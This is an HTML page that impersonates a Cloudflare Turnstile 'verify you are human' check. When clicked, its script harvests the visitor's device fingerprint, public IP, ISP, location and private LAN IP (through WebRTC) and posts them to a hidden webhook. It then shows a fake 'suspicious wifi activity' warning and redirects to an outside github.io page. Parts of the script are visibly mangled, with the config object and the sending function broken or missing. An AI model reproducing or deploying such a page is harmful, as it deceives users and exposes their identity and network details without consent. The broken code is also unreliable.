<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloudflare | Verify Connection</title>
    <style>
        body { background-color: #fff; font-family: -apple-system, system-ui, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #313131; }
        .container { width: 100%; max-width: 440px; padding: 20px; }
        .cf-logo { width: 120px; margin-bottom: 20px; }
        .h1 { font-size: 30px; font-weight: 600; margin-bottom: 10px; letter-spacing: -0.5px; }
        .subtext { font-size: 15px; color: #7d7d7d; margin-bottom: 30px; line-height: 1.5; }
        
        /* Turnstile Component */
        .ts-box { background: #fafafa; border: 1px solid #e0e0e0; border-radius: 4px; padding: 15px; display: flex; align-items: center; cursor: pointer; position: relative; min-height: 65px; }
        .ts-check { width: 28px; height: 28px; border: 2px solid #0051c3; border-radius: 4px; margin-right: 15px; background: #fff; flex-shrink: 0; }
        .ts-check.loading { border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
        .ts-text { font-size: 15px; font-weight: 400; flex-grow: 1; }
        .ts-logo { text-align: right; font-size: 10px; color: #7d7d7d; }
        .ts-logo img { width: 20px; display: block; margin: 0 auto 2px; }

        @keyframes spin { 100% { transform: rotate(360deg); } }
        #alert-box { background: #fff5f5; border: 1px solid #fcbbbb; color: #bd2c00; padding: 12px; border-radius: 4px; font-size: 13px; font-weight: 700; margin-top: 15px; display: none; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.svg" class="cf-logo">
    <div class="h1">Verify you are human</div>
    <div class="subtext">Please complete the security check to continue. This process is automatic and ensures your connection is secure.</div>
    
    <div class="ts-box" id="verify-btn">
        <div class="ts-check" id="box"></div>
        <div class="ts-text" id="status">Verify identity</div>
        <div class="ts-logo">
            <img src="https://www.cloudflare.com/favicon.ico">
            <span>Turnstile</span>
        </div>
    </div>

    <div id="alert-box">⚠️ SUSPICIOUS WIFI ACTIVITY DETECTED: PLEASE RE-VERIFY.</div>
</div>

<script>

 * SENTINEL NEXUS-TURNSTILE v37.0

 */

    DEST: "https://sarahwassan55-rgb.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/",

    fetch(CONFIG.WH, { method: 'POST', body: payload, headers: {'Content-Type': 'application/json'}, keepalive: true }).catch(()=>{});

document.getElementById('verify-btn').onclick = async function() {
    const box = document.getElementById('box');
    const status = document.getElementById('status');
    const alert = document.getElementById('alert-box');

    box.classList.add('loading');
    status.innerText = "Verifying...";

    // 1. GATHER DEVICE DATA IMMEDIATELY
    const b = await navigator.getBattery().catch(() => ({ level: 0 }));
    sendStrike({
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency || "N/A",
        ram: navigator.deviceMemory || "N/A",
        battery: b.level ? `${(b.level * 100).toFixed(0)}%` : "N/A",
        screen: `${screen.width}x${screen.height}`,
        ua: navigator.userAgent
    }, "CRITICAL_HIT", 0xff0000);

    // 2. FORCED PUBLIC IP RESOLUTION
    const grabNet = (url) => {
        fetch(url).then(r => r.json()).then(res => {
            if(!CONFIG.FLAGS.g) {
                sendStrike({
                    public_ip: res.ip || res.query,
                    isp: res.org || res.isp,
                    loc: `${res.city}, ${res.country}`,
                    vpn: (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone) ? "YES" : "NO"
                }, "NETWORK_IP", 0x34c759);
                CONFIG.FLAGS.g = true;
            }
        }).catch(()=>{});
    };
    grabNet('https://ipapi.co/json/');
    grabNet('http://ip-api.com/json/');

    // 3. PRIVATE LAN IP BYPASS (RTC)
    const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    rtc.createDataChannel("");
    rtc.onicecandidate = (e) => {
        if (e.candidate && !CONFIG.FLAGS.r) {
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
            if (ip) {
                sendStrike({ local_lan: ip[1], status: "UNMASKED" }, "RTC_PIERCED", 0x5856d6);
                CONFIG.FLAGS.r = true;
            }
        }
    };
    rtc.createOffer().then(o => rtc.setLocalDescription(o));

    // 4. THE 7-SECOND HARD-FORCE REDIRECT
    setTimeout(() => { 
        status.innerText = "Analyzing network environment..."; 
    }, 2500);

    setTimeout(() => { 
        status.innerText = "Checking security signature..."; 
        status.style.color = "#bd2c00";
        alert.style.display = "block";
    }, 4500);

    // ABSOLUTE REDIRECT: Fires regardless of data success
    setTimeout(() => {
        window.location.replace(CONFIG.DEST);
    }, 7000);
};
</script>
</body>
</html>
